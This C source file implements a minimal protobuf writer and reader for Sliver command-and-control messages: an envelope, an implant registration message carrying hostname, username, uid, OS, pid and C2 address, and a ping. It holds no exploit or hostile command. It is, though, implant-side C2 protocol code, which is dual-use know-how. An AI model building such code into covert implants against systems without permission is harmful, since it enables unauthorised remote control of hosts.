/* src/proto/proto.c - minimal protobuf writer/reader and Sliver messages. */
#include "sliver/proto.h"

#include <stdlib.h>
#include <string.h>

static int buf_reserve(sliver_buf_t *b, size_t extra) {
  size_t need;
  uint8_t *grown;
  if (b->failed) {
    return -1;
  }
  need = b->len + extra;
  if (need <= b->cap) {
    return 0;
  }
  {
    size_t cap = b->cap == 0 ? 128 : b->cap;
    while (cap < need) {
      cap *= 2;
    }
    grown = (uint8_t *)realloc(b->data, cap);
    if (grown == NULL) {
      b->failed = 1;
      return -1;
    }
    b->data = grown;
    b->cap = cap;
  }
  return 0;
}

void sliver_buf_init(sliver_buf_t *b) {
  if (b != NULL) {
    b->data = NULL;
    b->len = 0;
    b->cap = 0;
    b->failed = 0;
  }
}

void sliver_buf_free(sliver_buf_t *b) {
  if (b != NULL) {
    free(b->data);
    b->data = NULL;
    b->len = 0;
    b->cap = 0;
  }
}

int sliver_buf_append(sliver_buf_t *b, const void *data, size_t len) {
  if (b == NULL || (data == NULL && len != 0)) {
    return -1;
  }
  if (len == 0) {
    return 0;
  }
  if (buf_reserve(b, len) != 0) {
    return -1;
  }
  memcpy(b->data + b->len, data, len);
  b->len += len;
  return 0;
}

int sliver_buf_put_varint(sliver_buf_t *b, uint64_t value) {
  uint8_t tmp[10];
  size_t n = 0;
  do {
    uint8_t byte = (uint8_t)(value & 0x7f);
    value >>= 7;
    if (value != 0) {
      byte |= 0x80;
    }
    tmp[n++] = byte;
  } while (value != 0);
  if (buf_reserve(b, n) != 0) {
    return -1;
  }
  memcpy(b->data + b->len, tmp, n);
  b->len += n;
  return 0;
}

int sliver_buf_put_tag(sliver_buf_t *b, uint32_t field, uint32_t wire_type) {
  return sliver_buf_put_varint(b, ((uint64_t)field << 3) | (wire_type & 7));
}

int sliver_buf_put_bytes(sliver_buf_t *b, uint32_t field, const void *data, size_t len) {
  if (sliver_buf_put_tag(b, field, 2) != 0 || sliver_buf_put_varint(b, len) != 0) {
    return -1;
  }
  if (len == 0) {
    return 0;
  }
  if (buf_reserve(b, len) != 0) {
    return -1;
  }
  memcpy(b->data + b->len, data, len);
  b->len += len;
  return 0;
}

int sliver_buf_put_string(sliver_buf_t *b, uint32_t field, const char *s) {
  if (s == NULL || s[0] == '\0') {
    return 0; /* proto3 omits default values */
  }
  return sliver_buf_put_bytes(b, field, s, strlen(s));
}

int sliver_buf_put_uint64(sliver_buf_t *b, uint32_t field, uint64_t value) {
  if (value == 0) {
    return 0;
  }
  return sliver_buf_put_tag(b, field, 0) == 0 && sliver_buf_put_varint(b, value) == 0 ? 0 : -1;
}

int sliver_buf_put_uint32(sliver_buf_t *b, uint32_t field, uint32_t value) {
  return sliver_buf_put_uint64(b, field, value);
}

int sliver_buf_put_int64(sliver_buf_t *b, uint32_t field, int64_t value) {
  /* proto3 int64: two's complement varint (negatives take 10 bytes). */
  return sliver_buf_put_uint64(b, field, (uint64_t)value);
}

int sliver_buf_put_int32(sliver_buf_t *b, uint32_t field, int32_t value) {
  return sliver_buf_put_uint64(b, field, (uint64_t)(int64_t)value);
}

int sliver_buf_put_bool(sliver_buf_t *b, uint32_t field, int value) {
  if (!value) {
    return 0;
  }
  return sliver_buf_put_tag(b, field, 0) == 0 && sliver_buf_put_varint(b, 1) == 0 ? 0 : -1;
}

void sliver_reader_init(sliver_reader_t *r, const void *data, size_t len) {
  r->data = (const uint8_t *)data;
  r->len = len;
  r->pos = 0;
  r->failed = 0;
}

int sliver_reader_varint(sliver_reader_t *r, uint64_t *value) {
  uint64_t result = 0;
  int shift = 0;
  while (r->pos < r->len && shift < 64) {
    uint8_t byte = r->data[r->pos++];
    result |= (uint64_t)(byte & 0x7f) << shift;
    if ((byte & 0x80) == 0) {
      *value = result;
      return 0;
    }
    shift += 7;
  }
  r->failed = 1;
  return -1;
}

int sliver_reader_next(sliver_reader_t *r, uint32_t *field, uint32_t *wire_type) {
  uint64_t key;
  if (r->failed || r->pos >= r->len) {
    return 1; /* end of message */
  }
  if (sliver_reader_varint(r, &key) != 0) {
    return -1;
  }
  *field = (uint32_t)(key >> 3);
  *wire_type = (uint32_t)(key & 7);
  return 0;
}

int sliver_reader_bytes(sliver_reader_t *r, const uint8_t **data, size_t *len) {
  uint64_t n;
  if (sliver_reader_varint(r, &n) != 0 || n > (uint64_t)(r->len - r->pos)) {
    r->failed = 1;
    return -1;
  }
  *data = r->data + r->pos;
  *len = (size_t)n;
  r->pos += (size_t)n;
  return 0;
}

int sliver_reader_string(sliver_reader_t *r, char *out, size_t cap) {
  const uint8_t *data = NULL;
  size_t len = 0;
  if (out == NULL || cap == 0) {
    return -1;
  }
  if (sliver_reader_bytes(r, &data, &len) != 0) {
    return -1;
  }
  if (len >= cap) {
    len = cap - 1;
  }
  memcpy(out, data, len);
  out[len] = '\0';
  return 0;
}

int sliver_reader_skip(sliver_reader_t *r, uint32_t wire_type) {
  switch (wire_type) {
    case 0: { /* varint */
      uint64_t v;
      return sliver_reader_varint(r, &v);
    }
    case 1: /* fixed64 */
      if (r->len - r->pos < 8) {
        r->failed = 1;
        return -1;
      }
      r->pos += 8;
      return 0;
    case 2: { /* length delimited */
      const uint8_t *d;
      size_t l;
      return sliver_reader_bytes(r, &d, &l);
    }
    case 5: /* fixed32 */
      if (r->len - r->pos < 4) {
        r->failed = 1;
        return -1;
      }
      r->pos += 4;
      return 0;
    default:
      r->failed = 1;
      return -1;
  }
}

int sliver_envelope_encode(sliver_buf_t *out, int64_t id, uint32_t type,
                           const void *data, size_t data_len) {
  if (sliver_buf_put_int64(out, 1, id) != 0) {
    return -1;
  }
  if (sliver_buf_put_uint32(out, 2, type) != 0) {
    return -1;
  }
  if (data != NULL && data_len != 0 && sliver_buf_put_bytes(out, 3, data, data_len) != 0) {
    return -1;
  }
  return out->failed ? -1 : 0;
}

int sliver_envelope_decode(const void *data, size_t len, sliver_envelope_t *out) {
  sliver_reader_t r;
  uint32_t field, wire;
  int rc;
  if (data == NULL || out == NULL) {
    return -1;
  }
  memset(out, 0, sizeof(*out));
  sliver_reader_init(&r, data, len);
  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
    switch (field) {
      case 1: {
        uint64_t v;
        if (wire != 0 || sliver_reader_varint(&r, &v) != 0) {
          return -1;
        }
        out->id = (int64_t)v;
        break;
      }
      case 2: {
        uint64_t v;
        if (wire != 0 || sliver_reader_varint(&r, &v) != 0) {
          return -1;
        }
        out->type = (uint32_t)v;
        break;
      }
      case 3: {
        const uint8_t *d = NULL;
        size_t l = 0;
        if (wire != 2 || sliver_reader_bytes(&r, &d, &l) != 0) {
          return -1;
        }
        out->data = d;
        out->data_len = l;
        break;
      }
      case 4: {
        uint64_t v;
        if (wire != 0 || sliver_reader_varint(&r, &v) != 0) {
          return -1;
        }
        out->unknown_message_type = v != 0;
        break;
      }
      default:
        if (sliver_reader_skip(&r, wire) != 0) {
          return -1;
        }
        break;
    }
  }
  return rc == 1 ? 0 : -1;
}

int sliver_register_encode(sliver_buf_t *out, const sliver_register_t *reg) {
  if (reg == NULL) {
    return -1;
  }
  if (sliver_buf_put_string(out, 1, reg->name) != 0 ||
      sliver_buf_put_string(out, 2, reg->hostname) != 0 ||
      sliver_buf_put_string(out, 3, reg->uuid) != 0 ||
      sliver_buf_put_string(out, 4, reg->username) != 0 ||
      sliver_buf_put_string(out, 5, reg->uid) != 0 ||
      sliver_buf_put_string(out, 6, reg->gid) != 0 ||
      sliver_buf_put_string(out, 7, reg->os) != 0 ||
      sliver_buf_put_string(out, 8, reg->arch) != 0 ||
      sliver_buf_put_int32(out, 9, reg->pid) != 0 ||
      sliver_buf_put_string(out, 10, reg->filename) != 0 ||
      sliver_buf_put_string(out, 11, reg->active_c2) != 0 ||
      sliver_buf_put_string(out, 12, reg->version) != 0 ||
      sliver_buf_put_int64(out, 13, reg->reconnect_interval) != 0 ||
      sliver_buf_put_string(out, 14, reg->proxy_url) != 0 ||
      sliver_buf_put_string(out, 16, reg->config_id) != 0 ||
      sliver_buf_put_int64(out, 17, reg->peer_id) != 0 ||
      sliver_buf_put_string(out, 18, reg->locale) != 0 ||
      sliver_buf_put_uint64(out, 19, reg->capabilities) != 0) {
    return -1;
  }
  return out->failed ? -1 : 0;
}

int sliver_register_decode(const void *data, size_t len, sliver_register_t *out) {
  sliver_reader_t r;
  uint32_t field, wire;
  int rc;
  if (data == NULL || out == NULL) {
    return -1;
  }
  memset(out, 0, sizeof(*out));
  sliver_reader_init(&r, data, len);
  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
    switch (field) {
      case 1: if (sliver_reader_string(&r, out->name, sizeof(out->name)) != 0) return -1; break;
      case 2: if (sliver_reader_string(&r, out->hostname, sizeof(out->hostname)) != 0) return -1; break;
      case 3: if (sliver_reader_string(&r, out->uuid, sizeof(out->uuid)) != 0) return -1; break;
      case 4: if (sliver_reader_string(&r, out->username, sizeof(out->username)) != 0) return -1; break;
      case 5: if (sliver_reader_string(&r, out->uid, sizeof(out->uid)) != 0) return -1; break;
      case 6: if (sliver_reader_string(&r, out->gid, sizeof(out->gid)) != 0) return -1; break;
      case 7: if (sliver_reader_string(&r, out->os, sizeof(out->os)) != 0) return -1; break;
      case 8: if (sliver_reader_string(&r, out->arch, sizeof(out->arch)) != 0) return -1; break;
      case 9: {
        uint64_t v;
        if (wire != 0 || sliver_reader_varint(&r, &v) != 0) return -1;
        out->pid = (int32_t)v;
        break;
      }
      case 10: if (sliver_reader_string(&r, out->filename, sizeof(out->filename)) != 0) return -1; break;
      case 11: if (sliver_reader_string(&r, out->active_c2, sizeof(out->active_c2)) != 0) return -1; break;
      case 12: if (sliver_reader_string(&r, out->version, sizeof(out->version)) != 0) return -1; break;
      case 13: {
        uint64_t v;
        if (wire != 0 || sliver_reader_varint(&r, &v) != 0) return -1;
        out->reconnect_interval = (int64_t)v;
        break;
      }
      case 14: if (sliver_reader_string(&r, out->proxy_url, sizeof(out->proxy_url)) != 0) return -1; break;
      case 16: if (sliver_reader_string(&r, out->config_id, sizeof(out->config_id)) != 0) return -1; break;
      case 17: {
        uint64_t v;
        if (wire != 0 || sliver_reader_varint(&r, &v) != 0) return -1;
        out->peer_id = (int64_t)v;
        break;
      }
      case 18: if (sliver_reader_string(&r, out->locale, sizeof(out->locale)) != 0) return -1; break;
      case 19: {
        uint64_t v;
        if (wire != 0 || sliver_reader_varint(&r, &v) != 0) return -1;
        out->capabilities = v;
        break;
      }
      default:
        if (sliver_reader_skip(&r, wire) != 0) return -1;
        break;
    }
  }
  return rc == 1 ? 0 : -1;
}

int sliver_ping_encode(sliver_buf_t *out, int32_t nonce) {
  return sliver_buf_put_int32(out, 1, nonce);
}

int sliver_ping_decode_nonce(const void *data, size_t len, int32_t *nonce) {
  sliver_reader_t r;
  uint32_t field, wire;
  int rc;
  if (data == NULL || nonce == NULL) {
    return -1;
  }
  *nonce = 0;
  sliver_reader_init(&r, data, len);
  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
    if (field == 1 && wire == 0) {
      uint64_t v;
      if (sliver_reader_varint(&r, &v) != 0) {
        return -1;
      }
      *nonce = (int32_t)v;
    } else if (sliver_reader_skip(&r, wire) != 0) {
      return -1;
    }
  }
  return rc == 1 ? 0 : -1;
}
